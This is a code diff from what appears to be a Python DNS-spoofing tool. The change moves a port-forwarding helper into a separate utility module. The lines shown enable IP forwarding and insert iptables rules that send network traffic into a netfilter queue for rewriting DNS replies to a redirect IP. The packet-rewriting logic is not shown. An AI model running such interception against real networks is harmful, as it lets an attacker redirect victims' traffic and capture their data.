@@ -14,22 +14,13 @@ to the redirect IP. (see: DNS Spoofing)
 import subprocess
 import netfilterqueue
 import scapy.all as scapy
+from utils.enable_port_fwd import enable_port_fwd
 
 class Spoofer:
     def __init__(self, target_url, redirect_ip):
         self.target_url = target_url
         self.redirect_ip = redirect_ip
         self.instantiate_queue()
-
-    def enable_port_fwd(self):
-        """
-        Enables port forwarding through controller machine.
-        """
-        print("[+] Enabling port forwarding.")
-        ip_fwd_cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
-        # test_cmd = "echo 1 >> hello.txt"
-        proc = subprocess.Popen(ip_fwd_cmd, shell=True, stdout=subprocess.PIPE)
-        print(proc.communicate()[0]),
         
     def process_packet(self, packet): 
         """
@@ -71,7 +62,7 @@ class Spoofer:
         print("[+] Instantiating queue...")
         cmd = "iptables -I FORWARD -j NFQUEUE --queue-num 0"
         test_cmd = "iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0"
-        self.enable_port_fwd()
+        enable_port_fwd()
         proc = subprocess.Popen(test_cmd, shell=True, stdout=subprocess.PIPE)
         print(proc.communicate()[0]),
         self.bind_queue()
